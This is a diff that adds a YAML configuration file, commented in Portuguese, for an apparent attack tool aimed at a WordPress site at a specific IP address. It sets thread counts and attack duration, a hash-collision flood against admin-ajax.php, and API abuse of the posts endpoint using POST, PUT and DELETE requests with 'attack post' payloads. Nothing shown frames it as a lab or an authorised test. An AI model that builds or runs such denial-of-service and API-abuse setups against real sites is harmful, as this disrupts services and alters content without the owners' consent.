@@ -1,0 +1,24 @@
+# Configurações gerais
+general:
+  target_ip: "http://35.238.138.9/"
+  threads: 50                # Número de threads para ataques simultâneos
+  attack_duration: 300        # Duração do ataque em segundos (5 minutos)
+  log_file: "logs/combined_logs/combined_attack.log"
+
+# Configurações para o ataque de colisão de hash
+hash_collision:
+  endpoint: "/wp-admin/admin-ajax.php"  # Endpoint vulnerável para enviar colisões de hash
+  num_collisions: 1000                  # Número de colisões de hash a serem geradas
+  base_string: "test_string"            # String base para gerar colisões
+  hash_algorithm: "md5"                 # Algoritmo de hash (md5, sha1, sha256)
+
+# Configurações para o abuso de API
+api_abuse:
+  endpoint: "/wp-json/wp/v2/posts"      # Endpoint de API do WordPress
+  methods: ["GET", "POST", "PUT", "DELETE"] # Métodos HTTP para utilizar no abuso de API
+  headers:
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    Content-Type: "application/json"
+  data_payloads:
+    - {"title": "Attack Post 1", "content": "This is a test attack content"}
+    - {"title": "Attack Post 2", "content": "This is a second test attack content"}
